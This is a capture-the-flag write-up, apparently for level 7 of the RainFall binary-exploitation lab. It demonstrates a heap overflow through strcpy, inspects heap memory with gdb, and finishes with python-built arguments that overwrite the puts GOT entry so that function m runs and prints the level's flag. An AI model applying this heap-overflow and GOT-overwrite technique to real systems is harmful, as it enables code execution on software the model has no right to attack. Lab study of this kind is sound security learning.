# level 07

The program takes two parameters and print "~~":

```bash
level7@RainFall:~$ ./level7 
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 dsa
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 dsaasdasd
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 dsaasdasd saddsa
~~
```

By looking at the code, we can see that the program does two `strcpy`. It copies the two parameters respectively in two malloc'd buffer. There is also a function `m`, that print the content of a global variable `c` and the time elapsed between 1970.

We know that `strcpy` is vulnerable. It will copy bytes until it reaches a '\0'. We can override the buffer of the second `strcpy`.

We first look what addresses of malloc'd buffers are:

```bash
(gdb) r aaaa bbbb
Starting program: /home/user/level7/level7 aaaa bbbb

Breakpoint 1, 0x08048536 in main ()
(gdb) x $eax
0x804a008:      0x00000000
(gdb) c
Continuing.

Breakpoint 2, 0x080485d3 in main ()
(gdb) x/16wx 0x804a008
0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
0x804a018:      0x61616161      0x00000000      0x00000000      0x00000011
0x804a028:      0x00000002      0x0804a038      0x00000000      0x00000011
0x804a038:      0x62626262      0x00000000      0x00000000      0x00020fc1
```

We can see that our buffer begin at address 0x804a018. During the 2nd `strcpy`, the address is taken at 0x804a028 + 4 (0x0804a038).

We try to overwrite this address, so another buffer will be passed to `strcpy`:

```bash
(gdb) r $(python -c "print '\x41' * 20 + '\x42' * 4") CCCC
Starting program: /home/user/level7/level7 $(python -c "print '\x41' * 20 + '\x42' * 4") CCCC

Breakpoint 1, 0x080485a5 in main ()
(gdb) x/16wx 0x804a008
0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
0x804a018:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a028:      0x41414141      0x42424242      0x00000000      0x00000011
0x804a038:      0x00000000      0x00000000      0x00000000      0x00020fc1
```

We can now replace this value by the address of `puts` with the address of `m`. When calling `puts` at the end, it will jump on `m` function.

First we retrieve the address of `puts` from the GOT:

```bash
level7@RainFall:~$ objdump -R level7

level7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049904 R_386_GLOB_DAT    __gmon_start__
08049914 R_386_JUMP_SLOT   printf
08049918 R_386_JUMP_SLOT   fgets
0804991c R_386_JUMP_SLOT   time
08049920 R_386_JUMP_SLOT   strcpy
08049924 R_386_JUMP_SLOT   malloc
08049928 R_386_JUMP_SLOT   puts
0804992c R_386_JUMP_SLOT   __gmon_start__
08049930 R_386_JUMP_SLOT   __libc_start_main
08049934 R_386_JUMP_SLOT   fopen
...
(gdb) x/x 0x08049928
0x8049928 <puts@got.plt>:       0x08048406
```

We will here overwrite the 0x08048406 address with the address of `m`:

```bash
level7@RainFall:~$ ./level7 $(python -c "print '\x41' * 20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1653292834
```
